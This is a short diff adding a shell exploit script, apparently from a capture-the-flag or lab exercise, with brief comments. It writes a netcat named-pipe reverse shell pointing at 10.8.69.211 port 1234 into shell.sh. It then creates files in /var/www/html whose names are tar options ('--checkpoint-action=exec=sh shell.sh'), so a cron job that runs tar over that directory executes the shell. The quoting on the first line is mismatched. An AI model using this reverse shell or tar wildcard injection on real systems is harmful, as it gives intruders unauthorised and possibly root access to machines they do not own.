@@ -1,0 +1,10 @@
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.69.211 1234 >/tmp/f" >shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+
+
+
+#Explaination
+
+#line 1 10.8.69.211 1234 = ip address of local machine to lsiten and port = port to listen on
+#line 2 /var/www/html/ = directory that was tar from crontab
